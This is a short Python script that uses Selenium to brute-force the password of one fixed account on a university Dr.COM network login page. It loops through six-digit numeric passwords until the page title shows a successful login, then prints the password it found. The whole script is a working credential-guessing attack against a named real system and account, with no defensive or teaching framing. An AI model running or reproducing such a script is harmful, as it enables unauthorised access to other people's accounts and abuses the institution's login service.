#!/usr/bin/python
#coding:utf-8
from selenium import webdriver
import urllib
import re

key = 10000
name = '151421'

filt = r'<title>(.*?)</title>'

while key <= 999999 :

    print key

    key_str = str(key)
    while len(key_str) < 6:
        key_str = '0' + key_str
    
    driver = webdriver.Chrome()

    driver.get("https://drcom.szu.edu.cn/a70.html")

    driver.find_element_by_id("VipDefaultAccount").clear()
    driver.find_element_by_id("VipDefaultAccount").send_keys(name)
    driver.find_element_by_id("VipDefaultPassword").clear()
    driver.find_element_by_id("VipDefaultPassword").send_keys(key_str)

    driver.find_element_by_xpath("//input[@name='0MKKey'][@type='submit']").click()

    text = driver.page_source
    end = re.findall(filt, text, re.S|re.M)

    if end[0] == u'Drcom PC注销页':
        break

    driver.quit()

    key = key + 1

print 'the key is ' + str(key)
